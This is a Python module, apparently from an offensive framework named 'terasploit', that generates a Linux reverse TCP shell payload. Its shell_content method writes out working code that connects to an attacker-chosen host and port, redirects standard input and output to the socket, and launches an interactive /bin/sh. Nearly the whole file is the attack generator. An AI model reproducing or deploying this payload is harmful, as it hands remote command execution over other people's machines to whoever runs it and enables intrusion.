#######
# Module/Payload: Reverse TCP
#######

from libs.terasploit.framework.opts.opt_container import *
from libs.terasploit.framework.info.info_container import *
from libs.terasploit.framework.module.payload import *

class TerasploitPayload(Payload):
    
    module_type = 'payload'
    
    def initialize(self,info_only: bool = False) -> None:
        update_info (
            {
                'Module' : 'payload',
                'Name' : 'reverse tcp shell python',
                'Author' : 'Charlie (4steroth)',
                'Type' : 'reverse_tcp',
                'Arch' : 'python',
            
                'Description' : [
                    'python reverse tcp shell for linux platform'
                ],
            
                'Platform' : [
                    'Linux'
                ]
            }
        )
        
        if info_only:
            return

        register_option ("payload",opt=[
            OptIP.new("lhost",[
                "","yes","target listening address"
            ]),
            OptPort.new("lport",[
                4444,"yes","target listening port"
            ])
        ])
        
        
    def run(self) -> tuple[str, bool]: 
        payload_content = self.shell_content()
        payload_arch = module_info.payload_info['Arch']
        shell_name = module_info.payload_info['Type']
        info_print (f'Generating {shell_name}...')
        self.generate_file(shell_name,payload_arch,payload_content)
        info_print ('Shell generated!')
        info_print(f'Saved as {shell_name}.py')
        return 'done', True
        

    def shell_content(self) -> str:
        lhost = Opt('payload').GetOPT('lhost')
        lport = Opt('payload').GetOPT('lport')
        
        code: str = (
            'import socket, subprocess, os' + '\n' +
            's = socket.socket(socket.AF_INET,socket.SOCK_STREAM)' + '\n' +
           f's.connect(("{lhost}",{lport}))' + '\n' +
            'os.dup2(s.fileno(),0)' + '\n' +
            'os.dup2(s.fileno(),1)' + '\n' +
            'os.dup2(s.fileno(),2)' + '\n' +
            'p = subprocess.call(["/bin/sh","-i"])'
        )
        
        return code